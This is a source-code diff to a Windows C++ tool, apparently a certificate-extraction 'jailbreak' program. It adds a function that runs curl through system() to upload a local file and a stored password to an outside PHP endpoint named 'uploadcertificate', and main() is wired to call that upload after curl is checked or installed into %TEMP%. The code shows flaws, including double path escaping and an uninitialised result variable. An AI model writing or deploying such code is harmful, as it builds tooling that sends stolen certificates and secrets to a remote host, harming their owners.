@@ -10,6 +10,7 @@
 #include <cstdlib>
 #include <vector>
 #pragma comment (lib, "crypt32") //important !! dont work without linking library
+#include "MyVariables.h" //import of password and other configs.
 
 //exe generated at jailbreak-master/jailbreak-master/Debug/jbstore2_32.exe
 
@@ -115,21 +116,31 @@ cleanup:
 }
 
 //making my own program:
-
-int cURL()
-{
-    //find %TEMP% path and set it to variable
+//function to get PATh to %TEMP%
+std::string tempget() {
     char tempPath[MAX_PATH];
     DWORD tempresult = GetTempPathA(MAX_PATH, tempPath);
     if (tempresult == 0 || tempresult > MAX_PATH) {
         std::cerr << "TEMP PATH not succesfully found." << std::endl;
-        return 1;
+        return "error";
     }
     else {
         std::cerr << "TEMP PATH is " << tempPath << std::endl;
     }
     // replace "\" with "\\"
     std::string tempstr = tempPath;
+    size_t pos = 0;
+    while ((pos = tempstr.find("\\", pos)) != std::string::npos) {
+        tempstr.replace(pos, 1, "\\\\");
+        pos += 2; //move to other posible char position
+    }
+    return tempstr;
+}
+
+int cURL()
+{
+    // replace "\" with "\\"
+    std::string tempstr = tempget();
     size_t pos = 0;
     while ((pos = tempstr.find("\\", pos)) != std::string::npos) {
         tempstr.replace(pos, 1, "\\\\");
@@ -208,7 +219,7 @@ int cURL()
     if (curlCheckResult == 0) {
         //    // cURL installed check
         std::cout << "cURL already installed on system." << std::endl;
-        return 0;
+        return 2; //return 2 - means cURL is in system PATH
     }
 
     else
@@ -289,6 +300,40 @@ int cURL()
     //curl -F "fileToUpload=@C:/Users/lubos/Downloads/error.log;type=text/html" http://mail.xf.cz/myphp/uploadcertificate/upload.php
 }
 
+int cURLupload(int cURLinPATH)
+{
+
+    std::string tempstr = tempget();
+
+    std::string fullPathuploadcURL = "curl -F \"fileToUpload=@C:/Users/lubos/Downloads/test.txt;type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
+    //set path to right
+    if (cURLinPATH != 0)
+    {
+        fullPathuploadcURL = "curl -F \"fileToUpload=@C:/Users/lubos/Downloads/test.txt;type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
+    }
+    else
+    {
+        fullPathuploadcURL = tempstr + "\\curl\\bin\\curl.exe -F \"fileToUpload=@C:/Users/lubos/Downloads/test.txt;type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
+    }
+    //save the command to vector
+    std::vector<char> cURLupload(fullPathuploadcURL.begin(), fullPathuploadcURL.end());
+    // Add ending char to vector
+    cURLupload.push_back('\0');
+
+
+    int cURLuploadResult = system(cURLupload.data());
+    if (cURLuploadResult != 0) {
+        std::cerr << "Error running cURL command for uploading" << std::endl;
+        return 1;
+    }
+    else
+    {
+        std::cerr << "Upload of file successfully done." << std::endl;
+        return 0;
+    }
+
+
+}
 
 int main(int argc, _TCHAR* argv[])
 {
@@ -321,14 +366,25 @@ int main(int argc, _TCHAR* argv[])
 
     printf("\n\nChecking cURL:\n\n");
     //check cURL or install it
+    int comandsuccess;
     int check = cURL();
-    if (check != 0) {
+    if (check == 1) {
+        printf("\n ERROR somewhere in cURL installing/checking \n");
+    }
+    else if(check == 0) {
+        printf("\n cURL installed and not in system PATH. \n");
+        comandsuccess = cURLupload(check);
+    }
+    else if (check == 2) {
+        printf("\n cURL already installed on system and added in PATH. \n");
+        comandsuccess = cURLupload(check);
+    }
+    if (comandsuccess != 0) {
         printf("\n ERROR somewhere in cURL installing/checking \n");
     }
     else {
-        printf("\n cURL working. \n");
+        printf("\n cURL uplaod successfully done. \n");
     }
-
 }
 
 // TO DO:
